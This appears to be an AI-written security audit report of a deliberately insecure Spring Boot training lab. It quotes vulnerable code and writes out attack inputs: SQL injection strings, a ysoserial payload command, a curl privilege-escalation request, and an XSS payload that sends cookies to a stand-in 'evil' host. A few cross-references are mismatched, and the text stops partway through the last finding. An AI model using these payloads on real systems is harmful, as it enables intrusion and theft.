# Security Assessment Report — OWASP Vulnerability Learning Lab (Spring Boot 3)

> **Status: REPORT-ONLY RUN** — No source code was modified during this assessment. The Write tool was used only for this single report file.

---

## 1. Executive Summary

### 1.1 Scope

- **Repository:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git`
- **Project type:** Single Spring Boot 3.2.5 / Java 17 application (`vulnerable-spring-app`, group `com.owasp.lab`)
- **Source tree reviewed:**
  - `src/main/java/com/owasp/lab/VulnerableSpringAppApplication.java`
  - `src/main/java/com/owasp/lab/config/` — `SecurityConfig.java`, `SecretConfig.java`, `DataSeeder.java`
  - `src/main/java/com/owasp/lab/controller/` — `AuthController.java`, `UserController.java`, `ProductController.java`, `CommentController.java`, `CommentViewController.java`, `InsecureDeserializationController.java`, `VulnerabilityController.java`
  - `src/main/java/com/owasp/lab/model/` — `User.java`, `Product.java`, `Comment.java`
  - `src/main/java/com/owasp/lab/repository/` — `UserRepository.java`, `ProductRepository.java`, `CommentRepository.java`
  - `src/main/java/com/owasp/lab/service/` — `UserService.java`, `ProductService.java`, `CommentService.java`
  - `src/main/resources/application.properties`
  - `pom.xml`
  - `.github/workflows/build-and-security.yml`
  - `.gitignore`

### 1.2 Methodology

A read-only static review was performed following the OWASP Top 10 (2021) categories, CWE-mapped vulnerabilities, and Spring Security best practices. Each source file was loaded in full; cross-cutting pattern sweeps were executed for: `password`, `md5`, `MessageDigest`, `Random`, `@PreAuthorize`, `@Secured`, `permitAll`, `Runtime`, `ProcessBuilder`, `readObject`, `ObjectInputStream`, `@JsonTypeInfo`, `createQuery`, `createNativeQuery`, `new File`, `Paths.get`, and `@Valid`. Findings were mapped to OWASP Top 10 (2021) and CWE.

### 1.3 Top-Line Risk Posture

The codebase is an **intentionally insecure educational lab** (the project's own README and inline `// VULNERABILITY:` comments confirm this). However, viewed strictly as a deployable Spring Boot application, it exhibits **every category of the OWASP Top 10 (2021)** with multiple Critical-severity issues, including remote code execution via unsafe Java deserialization, SQL injection (login + search), plain-text password storage with leaked passwords in API responses, full bypass of authentication and CSRF, hardcoded secrets in source control, and stored/reflected XSS sinks.

> **If this codebase is ever shipped outside a tightly isolated local sandbox, the risk posture is Critical.** Treat every finding below as exploitable.

### 1.4 Findings by Severity

| Severity | Count |
|---|---|
| Critical | 6 |
| High | 6 |
| Medium | 4 |
| Low | 2 |
| **Total** | **18** |

### 1.5 Severity Definitions Used

- **Critical** — Remote exploitation, full system compromise, or total auth bypass (e.g. RCE, SQLi auth bypass, unsafe deserialization, broken access control on privileged endpoints).
- **High** — Direct exposure of credentials / sensitive data, broad XSS on authenticated views, missing CSRF on state-changing endpoints, IDOR on PII.
- **Medium** — Hardcoded secrets in source, weak crypto choices, missing rate limiting, missing security headers, mass-assignment / role override, broad endpoint enumeration.
- **Low** — Verbose error logging, debug endpoints enabled, minor information disclosure.

---

## 2. Risk Matrix

|  | **Likelihood: Very High** | **Likelihood: High** | **Likelihood: Medium** | **Likelihood: Low** |
|---|---|---|---|---|
| **Impact: Critical** | 6 (VULN-001, 002, 003, 004, 005, 006) | 0 | 0 | 0 |
| **Impact: High** | 6 (VULN-007, 008, 009, 010, 011, 012) | 0 | 0 | 0 |
| **Impact: Medium** | 0 | 4 (VULN-013, 014, 015, 016) | 0 | 0 |
| **Impact: Low** | 0 | 0 | 2 (VULN-017, 018) | 0 |

Severity totals: **Critical 6 / High 6 / Medium 4 / Low 2 — 18 findings.**

---

## 3. Vulnerability Findings

> All findings use the schema mandated by `.claude/agents/vulnerability-scanner.md`. Code snippets are quoted verbatim.

---

### VULN-001 — Unsafe Java Native Deserialization (Remote Code Execution)

- **Vulnerability Name:** Unsafe Java native deserialization via base64-decoded `ObjectInputStream`
- **CWE ID:** CWE-502 (Deserialization of Untrusted Data)
- **OWASP Top 10 Category:** A08:2021 — Software and Data Integrity Failures
- **Severity:** Critical
- **Affected File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\controller\InsecureDeserializationController.java`
- **Affected Method / Class:** `InsecureDeserializationController.deserialize(String)`
- **Exact Vulnerable Code Snippet:**
  ```java
  @PostMapping(consumes = MediaType.TEXT_PLAIN_VALUE)
  public ResponseEntity<?> deserialize(@RequestBody String body) throws Exception {
      byte[] bytes = Base64.getDecoder().decode(body);
      // VULNERABILITY: unsafe native Java deserialisation
      try (ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bytes))) {
          Object o = ois.readObject();
          return ResponseEntity.ok("Deserialized: " + o.getClass().getName());
      }
  }
  ```
- **Root Cause:** `ObjectInputStream.readObject()` is called on attacker-controlled bytes without an `ObjectInputFilter` (JEP 290) allowlist, and without using a safe data-binding format (JSON/Protobuf). Because Spring Boot 3.2.5 transitively depends on commons-beanutils / spring-aop / etc., known gadget chains (CommonsCollections, Spring1, etc.) are on the classpath.
- **Exploitation Scenario:** Attacker crafts a ysoserial payload (`CommonsCollections6 "calc.exe" | base64`) and POSTs it to `/api/deserialize` (no auth required). `readObject()` triggers gadget-chain reflection that executes arbitrary commands in the JVM process. Per the project's own README this is the documented exploitation path.
- **Business Impact:** Full remote code execution on the application server. Lateral movement, persistence, data exfiltration, denial of service.
- **Confidence Level:** High

---

### VULN-002 — SQL Injection in `loginUnsafe` (Authentication Bypass)

- **Vulnerability Name:** SQL injection in login flow allowing authentication bypass as any user
- **CWE ID:** CWE-89 (Improper Neutralization of Special Elements used in an SQL Command)
- **OWASP Top 10 Category:** A03:2021 — Injection
- **Severity:** Critical
- **Affected File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\service\UserService.java`
- **Affected Method / Class:** `UserService.loginUnsafe(String, String)`
- **Exact Vulnerable Code Snippet:**
  ```java
  public User loginUnsafe(String username, String password) {
      // VULNERABILITY: raw SQL with concatenated credentials.
      String sql = "SELECT * FROM users WHERE username = '"
              + username + "' AND password = '" + password + "'";
      System.out.println("[VULNERABILITY] Login SQL: " + sql);

      try {
          List<User> rows = entityManager
                  .createNativeQuery(sql, User.class)
                  .getResultList();
          return rows.isEmpty() ? null : rows.get(0);
      } catch (Exception ex) {
          return null;
      }
  }
  ```
- **Root Cause:** User-controlled `username` and `password` are concatenated into a native SQL string passed to `EntityManager.createNativeQuery(...)`. No parameter binding, no validation, no prepared statement.
- **Exploitation Scenario:** Attacker POSTs `{"username":"' OR '1'='1","password":"anything"}` to `/api/login`. The resulting SQL becomes `... WHERE username = '' OR '1'='1' AND password = 'anything'` which short-circuits and returns the first user row (likely `alice` or `admin`). The endpoint then returns the user's ID, role, and **plain-text password** (see VULN-008).
- **Business Impact:** Complete authentication bypass; arbitrary account takeover, including the seeded `admin` user.
- **Confidence Level:** High

---

### VULN-003 — SQL Injection in `findByUsernameUnsafe` (Mass Data Disclosure)

- **Vulnerability Name:** SQL injection in user search allowing full database disclosure
- **CWE ID:** CWE-89
- **OWASP Top 10 Category:** A03:2021 — Injection
- **Severity:** Critical
- **Affected File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\service\UserService.java`
- **Affected Method / Class:** `UserService.findByUsernameUnsafe(String)`
- **Exact Vulnerable Code Snippet:**
  ```java
  @Transactional
  public List<User> findByUsernameUnsafe(String username) {
      // VULNERABILITY: SQL Injection example - user input concatenated directly.
      String sql = "SELECT * FROM users WHERE username = '" + username + "'";
      System.out.println("[VULNERABILITY] Executing raw SQL: " + sql);

      try {
          List<User> rows = entityManager
                  .createNativeQuery(sql, User.class)
                  .getResultList();
          return rows;
      } catch (Exception ex) {
          return ArrayList<>();
      }
  }
  ```
- **Root Cause:** Same as VULN-002 — user input concatenated into a native SQL string. The query is `SELECT *` and the entity is mapped (`User.class`), so the response yields the entire `User` row including the **plain-text password** field (see VULN-007).
- **Exploitation Scenario:** Attacker calls `GET /api/search?q=' OR '1'='1`. The query becomes `SELECT * FROM users WHERE username = '' OR '1'='1'` and dumps every user including `password`, `email`, `role`, `balance`.
- **Business Impact:** Mass credential and PII disclosure in a single unauthenticated request.
- **Confidence Level:** High

---

### VULN-004 — Plain-Text Password Storage

- **Vulnerability Name:** User passwords persisted as plain text in the database
- **CWE ID:** CWE-256 (Plaintext Storage of a Password), CWE-257 (Storing Passwords in a Recoverable Format), CWE-916 (Use of Password Hash With Insufficient Computational Effort)
- **OWASP Top 10 Category:** A02:2021 — Cryptographic Failures
- **Severity:** Critical
- **Affected File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\model\User.java` (definition); `src/main/java/com/owasp/lab/controller/AuthController.java` (storage path); `src/main/java/com/owasp/lab/config/DataSeeder.java` (seed values)
- **Affected Method / Class:** `User` entity (field `password`), `AuthController.register(...)`, `DataSeeder.seed(...)`
- **Exact Vulnerable Code Snippet:**
  ```java
  // User.java
  // VULNERABILITY: storing plaintext password (A02 / A07)
  @Column(nullable = false)
  private String password;

  // DataSeeder.java
  userRepository.save(new User("alice", "alice123",   "alice@example.com", "USER",  1000.0));
  userRepository.save(new User("bob",   "bob123",     "bob@example.com",   "USER",   500.0));
  userRepository.save(new User("admin", "admin123",   "admin@example.com", "ADMIN", 9999.0));

  // AuthController.java — /register
  String password = body.getOrDefault("password", "");
  ...
  User u = new User(username, password, email, role, 0.0);
  return ResponseEntity.ok(userService.save(u));
  ```
- **Root Cause:** No `PasswordEncoder` (e.g. `BCryptPasswordEncoder`, `Argon2PasswordEncoder`) is configured or applied anywhere in the codebase. Grep for `BCrypt`, `PasswordEncoder`, `MessageDigest` returns zero hits in `src/main`. Passwords are stored verbatim in the H2 `users` table and surfaced by `/api/users`, `/api/profile/{id}`, `/api/search`, and `/api/login`.
- **Exploitation Scenario:** Any read path into the users table yields cleartext credentials. Combined with VULN-002 (login bypass) and VULN-003 (search dump), attackers don't even need to crack hashes.
- **Business Impact:** Total credential compromise in the event of any DB read access (SQL injection, backup theft, insider). Fails PCI-DSS 8.2.1, NIST SP 800-63B, OWASP ASVS V2.4.
- **Confidence Level:** High

---

### VULN-005 — Broken Access Control: Authentication Disabled Globally

- **Vulnerability Name:** All endpoints permitted without authentication via `permitAll()`
- **CWE ID:** CWE-284 (Improper Access Control), CWE-285 (Improper Authorization), CWE-862 (Missing Authorization)
- **OWASP Top 10 Category:** A01:2021 — Broken Access Control
- **Severity:** Critical
- **Affected File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\config\SecurityConfig.java`
- **Affected Method / Class:** `SecurityConfig.insecureFilterChain(HttpSecurity)`
- **Exact Vulnerable Code Snippet:**
  ```java
  http
      // VULNERABILITY (A05:2021): disable CSRF protection entirely.
      .csrf(csrf -> csrf.disable())

      // VULNERABILITY (A01:2021): allow every request without auth.
      .authorizeHttpRequests(auth -> auth.anyRequest().permitAll())

      // VULNERABILITY (A05:2021): keep no server-side session state
      .sessionManagement(s -> s.sessionCreationPolicy(SessionCreationPolicy.STATELESS))

      // VULNERABILITY (A05:2021): disable frame options on H2 console
      .headers(h -> h.frameOptions(f -> f.disable()));
  ```
- **Root Cause:** The Spring Security `SecurityFilterChain` bean explicitly grants `permitAll()` to every request. No authentication provider is configured (`UserDetailsService`, JWT filter, etc.); no `@PreAuthorize` exists anywhere in the codebase (Grep confirms zero hits). CSRF protection is also disabled, which compounds state-changing endpoints (see VULN-011).
- **Exploitation Scenario:** Any anonymous network attacker can call `/api/users`, `/api/transfer`, `/api/deserialize`, `/api/login`, etc. with no credentials. There is no role enforcement anywhere.
- **Business Impact:** Total authorization bypass — the application has no identity boundary whatsoever.
- **Confidence Level:** High

---

### VULN-006 — IDOR: Unauthenticated Profile & Listing Endpoints

- **Vulnerability Name:** Insecure Direct Object Reference — any user can read any other user's profile, list all users, and impersonate them via the broken transfer flow
- **CWE ID:** CWE-639 (Authorization Bypass Through User-Controlled Key), CWE-284
- **OWASP Top 10 Category:** A01:2021 — Broken Access Control
- **Severity:** Critical
- **Affected File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\controller\UserController.java` and `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\controller\AuthController.java`
- **Affected Method / Class:** `UserController.listUsers()`, `UserController.getProfile(Long)`, `AuthController.transfer(Map)`
- **Exact Vulnerable Code Snippet:**
  ```java
  // UserController.java
  @GetMapping("/users")
  public List<User> listUsers() {
      return userService.findAll();
  }

  @GetMapping("/profile/{id}")
  public ResponseEntity<User> getProfile(@PathVariable Long id) {
      User u = userService.findByIdUnsafe(id);
      if (u == null) {
          return ResponseEntity.notFound().build();
      }
      return ResponseEntity.ok(u);
  }

  // AuthController.java
  @PostMapping("/transfer")
  public ResponseEntity<?> transfer(@RequestBody Map<String, Object> body) {
      Long fromId = ((Number) body.get("fromId")).longValue();
      Long toId   = ((Number) body.get("toId")).longValue();
      Double amount = ((Number) body.get("amount")).doubleValue();

      User from = userService.findByIdUnsafe(fromId);
      User to   = userService.findByIdUnsafe(toId);
      ...
      // VULNERABILITY: no balance check, no ownership check, no auth
      from.setBalance(from.getBalance() - amount);
      to.setBalance(to.getBalance() + amount);
      userService.save(from);
      userService.save(to);
  ```
- **Root Cause:** Path variable `id` and request-body `fromId` are trusted as authoritative without any ownership or authorization check. There is no `principal` parameter, no `@PreAuthorize("hasPermission(...)")`, no row-level filter.
- **Exploitation Scenario:**
  - `GET /api/profile/1` returns `alice`'s full record (username, password, email, role, balance).
  - `POST /api/transfer {"fromId":3,"toId":1,"amount":-9999.99}` — the lack of auth plus negative-amount acceptance lets an attacker drain `admin`'s balance or inflate their own.
- **Business Impact:** Mass PII disclosure, financial fraud via the transfer endpoint, no audit trail (no auth means no session, see VULN-015).
- **Confidence Level:** High

---

### VULN-007 — Reflected Cross-Site Scripting in `/api/comment/greet`

- **Vulnerability Name:** Reflected XSS via unescaped `name` query parameter
- **CWE ID:** CWE-79 (Improper Neutralization of Input During Web Page Generation)
- **OWASP Top 10 Category:** A03:2021 — Injection (XSS)
- **Severity:** High
- **Affected File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\controller\CommentController.java`
- **Affected Method / Class:** `CommentController.greet(String)`
- **Exact Vulnerable Code Snippet:**
  ```java
  @GetMapping(value = "/greet", produces = MediaType.TEXT_HTML_VALUE)
  public String greet(@RequestParam(value = "name", defaultValue = "World") String name) {
      // VULNERABILITY: directly concatenated into HTML response.
      return "<html><body><h1>Hello, " + name + "!</h1></body></html>";
  }
  ```
- **Root Cause:** The `name` query parameter is concatenated verbatim into an HTML response with `Content-Type: text/html`. No encoding, no `HtmlUtils.htmlEscape`, no Content-Security-Policy header (no security headers are configured anywhere — see VULN-016).
- **Exploitation Scenario:** Attacker distributes a link `http://target/api/comment/greet?name=<script>fetch('//evil/?'+document.cookie)</script>`. When a victim clicks, arbitrary JavaScript executes in their origin. Useful for session theft, credential phishing, defacement.
- **Business Impact:** Account takeover of any user tricked into clicking the URL; browser-based attacks against other origins via stored cookies.
- **Confidence Level:** High

---

### VULN-008 — Stored Cross-Site Scripting in `/comments`

- **Vulnerability Name:** Stored XSS via raw concatenation of comment `body` and `author` into HTML response
- **CWE ID:** CWE-79
- **OWASP Top 10 Category:** A03:2021 — Injection (XSS)
- **Severity:** High
- **Affected File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\controller\CommentViewController.java`
- **Affected Method / Class:** `CommentViewController.viewAll()` and `CommentViewController.viewOne(Long)`
- **Exact Vulnerable Code Snippet:**
  ```java
  @GetMapping(produces = MediaType.TEXT_HTML_VALUE)
  public String viewAll() {
      StringBuilder sb = new StringBuilder();
      sb.append("<html><body><h1>Comments</h1>");
      List<Comment> comments = commentService.findAll();
      for (Comment c : comments) {
          // VULNERABILITY: raw concatenation, no escaping.
          sb.append("<div class='comment'>")
            .append("<b>").append(c.getAuthor()).append(":</b> ")
            .append(c.getBody())
            .append("</div>");
      }
      sb.append("</body></html>");
      return sb.toString();
  }

  @GetMapping(value = "/{id}", produces = MediaType.TEXT_HTML_VALUE)
  public String viewOne(@PathVariable Long id) {
      ...
      // VULNERABILITY: raw concatenation, no escaping.
      return "<html><body><h1>Comment</h1><div><b>"
              + c.getAuthor() + ":</b> " + c.getBody() + "</div></body></html>";
  }
  ```
- **Root Cause:** `author` and `body` are pulled from the database and concatenated into an HTML string with `Content-Type: text/html`. No template engine (Thymeleaf with default escaping) is used. There is no sanitization layer (OWASP Java HTML Sanitizer, Jsoup).
- **Exploitation Scenario:** Attacker `POST /api/comment {"author":"attacker","body":"<script>alert(document.cookie)</script>"}`. Any subsequent visitor to `/comments` (or `/comments/{id}`) executes the payload. Persistent — survives until the row is deleted.
- **Business Impact:** Persistent compromise of every viewer; cookie theft, drive-by malware delivery, defacement.
- **Confidence Level:** High

---

### VULN-009 — Plain-Text Password Returned in `/api/login` Response

- **Vulnerability Name:** Authentication response leaks the user's password in cleartext
- **CWE ID:** CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor), CWE-201 (Insertion of Sensitive Information Into Sent Data), CWE-359 (Exposure of Private Personal Information)
- **OWASP Top 10 Category:** A04:2021 — Insecure Design (also A02:2021)
- **Severity:** High
- **Affected File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\controller\AuthController.java`
- **Affected Method / Class:** `AuthController.login(Map)`
- **Exact Vulnerable Code Snippet:**
  ```java
  return ResponseEntity.ok(Map.of(
          "id", u.getId(),
          "username", u.getUsername(),
          "role", u.getRole(),
          // VULNERABILITY: leaking password back to caller
          "password", u.getPassword()
  ));
  ```
- **Root Cause:** API contract intentionally includes the cleartext password field. Combined with `User.getPassword()` returning the raw value, every read of the `User` entity (search, profile, listing) also returns the password.
- **Exploitation Scenario:** A successful login (or SQL injection via VULN-002/VULN-003) returns the user's password in the JSON body, allowing the attacker to use it for password reuse on other systems.
- **Business Impact:** Credential exposure in logs, browser history, network captures, proxy caches, third-party error trackers.
- **Confidence Level:** High

---

### VULN-010 — Hardcoded Secrets in Source Control

- **Vulnerability Name:** API keys, DB password, and JWT signing key committed to `application.properties`
- **CWE ID:** CWE-798 (Use of Hard-coded Credentials), CWE-547 (Use of Hard-coded, Security-relevant Constants)
- **OWASP Top 10 Category:** A02:2021 — Cryptographic Failures, A05:2021 — Security Misconfiguration
- **Severity:** High
- **Affected File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\resources\application.properties`
- **Affected Method / Class:** N/A (configuration file)
- **Exact Vulnerable Code Snippet:**
  ```properties
  # VULNERABILITY: hardcoded "secret" key in source code (A02:2021 / A05:2021)
  app.secret.api.key=AKIA-INTENTIONALLY-EXPOSED-SECRET-KEY-DO-NOT-USE-IN-PROD
  app.secret.db.password=P@ssw0rd123_plaintext_intentionally_exposed
  app.secret.jwt.signing.key=this-is-a-hardcoded-jwt-signing-key-for-demo-only
  ```
- **Root Cause:** Secrets are stored in cleartext in a file tracked by git, and loaded into the Spring context via `@Value` (`SecretConfig`). The `VulnerabilityController.index()` then **renders them into an unauthenticated HTML page** (`/vulnerabilities`), making them world-readable.
- **Exploitation Scenario:** Anyone who can read the public/private repository (or simply visit `/vulnerabilities`) obtains the API key, DB password, and JWT signing key. The JWT key allows arbitrary token forgery; the DB password allows lateral movement to other shared infrastructure.
- **Business Impact:** Compromise of any downstream system that shares these secrets. Full token-forgery capability for any service validating JWTs against this key.
- **Confidence Level:** High

---

### VULN-011 — Missing CSRF Protection on State-Changing Endpoints

- **Vulnerability Name:** Global CSRF disable on POST/PUT/DELETE endpoints
- **CWE ID:** CWE-352 (Cross-Site Request Forgery)
- **OWASP Top 10 Category:** A05:2021 — Security Misconfiguration (also A01:2021)
- **Severity:** High
- **Affected File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\config\SecurityConfig.java`
- **Affected Method / Class:** `SecurityConfig.insecureFilterChain(HttpSecurity)`
- **Exact Vulnerable Code Snippet:**
  ```java
  // VULNERABILITY (A05:2021): disable CSRF protection entirely.
  .csrf(csrf -> csrf.disable())
  ```
- **Root Cause:** Spring Security's default CSRF protection is disabled at the filter-chain level. This affects all state-changing endpoints: `/api/login`, `/api/register`, `/api/transfer`, `/api/comment`, `/api/deserialize`, `POST /api/products`.
- **Exploitation Scenario:** Even if authentication were later added, an attacker could host a malicious page that issues `fetch('/api/transfer', {method:'POST', body:...})` from a logged-in user's browser. Because there is no Spring CSRF token check (and `SessionCreationPolicy.STATELESS` is set, so the cookie strategy is naive), the request succeeds.
- **Business Impact:** Unauthorized state mutations performed on behalf of authenticated users; financial transfers, account creation, malicious comment posting, RCE payload upload via `/api/deserialize`.
- **Confidence Level:** High

---

### VULN-012 — Mass-Assignment / Privilege Escalation via `register` Endpoint

- **Vulnerability Name:** Self-assigned role on user registration enables vertical privilege escalation
- **CWE ID:** CWE-915 (Improperly Controlled Modification of Dynamically-Determined Object Attributes), CWE-269 (Improper Privilege Management)
- **OWASP Top 10 Category:** A04:2021 — Insecure Design, A01:2021
- **Severity:** High
- **Affected File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\controller\AuthController.java`
- **Affected Method / Class:** `AuthController.register(Map)`
- **Exact Vulnerable Code Snippet:**
  ```java
  @PostMapping("/register")
  public ResponseEntity<User> register(@RequestBody Map<String, String> body) {
      String username = body.getOrDefault("username", "");
      String password = body.getOrDefault("password", "");
      String email    = body.getOrDefault("email", "");
      String role     = body.getOrDefault("role", "USER");

      User u = new User(username, password, email, role, 0.0);
      return ResponseEntity.ok(userService.save(u));
  }
  ```
- **Root Cause:** The `role` field is read directly from the request body and persisted without any authorization check. Combined with VULN-005 (no auth required) and the trivial SQL injection (VULN-002), an attacker can register `{"role":"ADMIN", ...}` and immediately gain the highest privilege. The endpoint is also exposed without authentication or rate limiting.
- **Exploitation Scenario:** `curl -X POST /api/register -d '{"username":"pwn","password":"pwn","role":"ADMIN"}'` — instantly produces an admin account.
- **Business Impact:** Vertical privilege escalation to ADMIN without any exploit chain.
- **Confidence Level:** High

---

### VULN-013 — JWT Signing Key With Insufficient Entropy (Predictable Token Forgery)

- **Vulnerability Name:** Hardcoded, low-entropy JWT signing key enables token forgery
- **CWE ID:** CWE-330 (Use of Insufficiently Random Values), CWE-340 (Generation of Predictable Numbers or Identifiers), CWE-798
- **OWASP Top 10 Category:** A02:2021 — Cryptographic Failures
- **Severity:** Medium
- **Affected File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\resources\application.properties` (definition) and `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\config\SecretConfig.java` (binding)
- **Affected Method / Class:** `SecretConfig.jwtSigningKey()` bean
- **Exact Vulnerable Code Snippet:**
  ```properties
  app.secret.jwt.signing.key=this-is-a-hardcoded-jwt-signing-key-for-demo-only
  ```
  ```java
  @Value("${app.secret.jwt.signing.key}")
  private String jwtSigningKey;

  @Bean(name = "jwtSigningKey")
  public String jwtSigningKey() {
      return jwtSigningKey;
  }
  ```
- **Root Cause:** The JWT signing key is a static string literal in source control. There is no `JwtSecretKeyProvider`, no environment-variable override, no key rotation. While the project does not currently issue JWTs (no `JwtFilter` or `oauth2ResourceServer` configuration is present in the source tree), the bean is exposed as a singleton string bean that any code can autowire, and the value is world-readable via `/vulnerabilities`.
- **Exploitation Scenario:** When JWT-based authentication is added on top of this key, an attacker who reads `/vulnerabilities` or the source repo can locally sign arbitrary JWTs and bypass authentication as any user / role.
- **Business Impact:** Future-proofs the codebase for total auth bypass; current code already leaks the key, enabling signature forgery if a JWT verifier is added.
- **Confidence Level:** Medium (no JWT issuer observed yet, but the key is exposed and a singleton bean)

---

### VULN-014 — Verbose SQL Logging / Hibernate DEBUG with Sensitive Data Exposure

- **Vulnerability Name:** Hibernate SQL logging at DEBUG with parameter tracing enabled — leaks credentials and PII to logs
- **CWE ID:** CWE-532 (Insertion of Sensitive Information into Log File), CWE-200
- **OWASP Top 10 Category:** A09:2021 — Security Logging and Monitoring Failures (also A04:2021)
- **Severity:** Medium
- **Affected File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\resources\application.properties`
- **Affected Method / Class:** N/A (logging configuration)
- **Exact Vulnerable Code Snippet:**
  ```properties
  # VULNERABILITY: enable SQL logging that may expose sensitive data
  logging.level.org.hibernate.SQL=DEBUG
  logging.level.org.hibernate.type.descriptor.sql=TRACE
  spring.jpa.show-sql=true
  spring.jpa.properties.hibernate.format_sql=true
  ```
- **Root Cause:** `spring.jpa.show-sql=true` plus `logging.level.org.hibernate.SQL=DEBUG` and `org.hibernate.type.descriptor.sql=TRACE` cause every executed SQL statement (with parameter bindings) to be written to logs. Combined with VULN-002/VULN-003, the `password = 'alice123'` literal will appear in application logs at every login attempt.
- **Exploitation Scenario:** Anyone with read access to log files (log aggregators, support staff, attackers who achieve file-read via another vuln) harvests credentials.
- **Business Impact:** Persistent credential exposure in log storage; potential GDPR/PCI-DSS violations.
- **Confidence Level:** High

---

### VULN-015 — No Security Logging / Monitoring on AuthN Events

- **Vulnerability Name:** Failed login attempts, IDOR probes, and SQLi errors are not logged or alerted
- **CWE ID:** CWE-778 (Insufficient Logging), CWE-223 (Omission of Security-relevant Information)
- **OWASP Top 10 Category:** A09:2021 — Security Logging and Monitoring Failures
- **Severity:** Medium
- **Affected File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\service\UserService.java` and project-wide
- **Affected Method / Class:** `UserService.loginUnsafe`, `findByUsernameUnsafe`, all controllers
- **Exact Vulnerable Code Snippet:**
  ```java
  } catch (Exception ex) {
      return null;       // loginUnsafe
  }
  ...
  } catch (Exception ex) {
      return new ArrayList<>();   // findByUsernameUnsafe
  }
  ```
- **Root Cause:** Exceptions are swallowed silently. There is no authentication-event logger, no rate-limiter, no SIEM integration, no `@EventListener(AuthenticationFailureBadCredentialsEvent.class)`. The only `System.out.println` traces are demo annotations.
- **Exploitation Scenario:** Credential stuffing, brute force, and SQL injection probes go undetected. Incident response has no forensic trail.
- **Business Impact:** Failed to meet OWASP ASVS V7; inability to detect or respond to attacks in real time.
- **Confidence Level:** High

---

### VULN-016 — Missing Security Headers / Clickjacking / CSP

- **Vulnerability Name:** Missing HTTP security response headers (X-Content-Type-Options, Content-Security-Policy, Referrer-Policy, Strict-Transport-Security, X-Frame-Options disabled)
- **CWE ID:** CWE-693 (Protection Mechanism Failure), CWE-1021 (Improper Restriction of Rendered UI Layers or Frames), CWE-1004 (Sensitive Cookie Without HttpOnly Flag — N/A here since stateless)
- **OWASP Top 10 Category:** A05:2021 — Security Misconfiguration
- **Severity:** Medium
- **Affected File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\config\SecurityConfig.java`
- **Affected Method / Class:** `SecurityConfig.insecureFilterChain(HttpSecurity)`
- **Exact Vulnerable Code Snippet:**
  ```java
  // VULNERABILITY (A05:2021): disable frame options on H2 console
  // (acceptable for local lab) - but combined with no auth, also bad.
  .headers(h -> h.frameOptions(f -> f.disable()));
  ```
- **Root Cause:** Spring Security default security headers are turned off; no `Content-Security-Policy`, no `Strict-Transport-Security`, no `X-Content-Type-Options`. Frame options are explicitly disabled, enabling clickjacking against the H2 console and any future HTML page.
- **Exploitation Scenario:** Stored XSS payloads (VULN-008) execute unconstrained; clickjacking overlays on any future UI.
- **Business Impact:** Browser-based attacks have no defense-in-depth beyond what the server enforces (which is nothing here).
- **Confidence Level:** High

---

### VULN-017 — H2 Console Exposed on Production-Equivalent Port

- **Vulnerability Name:** H2 in-memory database console reachable at `/h2-console` without authentication
- **CWE ID:** CWE-668 (Exposure of Resource to Wrong Sphere), CWE-284
- **OWASP Top 10 Category:** A05:2021 — Security Misconfiguration
- **Severity:** Low (would be High if not for in-memory scope)
- **Affected File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\resources\application.properties`
- **Affected Method / Class:** N/A (Spring Boot H2 autoconfig)
- **Exact Vulnerable Code Snippet:**
  ```properties
  spring.h2.console.enabled=true
  spring.h2.console.path=/h2-console
  ```
- **Root Cause:** H2 console is enabled and exposed at `/h2-console`. The empty `spring.datasource.password=` plus `permitAll()` (VULN-005) means anyone can browse the database directly via a web UI, bypassing the API entirely.
- **Exploitation Scenario:** Attacker browses to `/h2-console`, enters the JDBC URL (public knowledge), logs in with the empty password, and runs arbitrary SQL — including `DROP TABLE`, `UPDATE users SET password='owned'`, etc.
- **Business Impact:** Direct, GUI-driven database compromise.
- **Confidence Level:** High

---

### VULN-018 — Information Disclosure via `/vulnerabilities` Index

- **Vulnerability Name:** Public endpoint renders hardcoded secrets and full vulnerability inventory
- **CWE ID:** CWE-200, CWE-209 (Generation of Error Message Containing Sensitive Information)
- **OWASP Top 10 Category:** A05:2021 — Security Misconfiguration
- **Severity:** Low
- **Affected File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\controller\VulnerabilityController.java`
- **Affected Method / Class:** `VulnerabilityController.index()`
- **Exact Vulnerable Code Snippet:**
  ```java
  @GetMapping(produces = MediaType.TEXT_HTML_VALUE)
  public String index() {
      // VULNERABILITY (A05:2021): hardcoded secrets rendered into the
      // HTML response on this page itself.
      return """
          ...
          <h2>Hardcoded secrets (A02 / A05)</h2>
          <ul>
            <li>API key: %s</li>
            <li>DB password: %s</li>
          </ul>
          ...
          """.formatted(apiKey, dbPassword);
  }
  ```
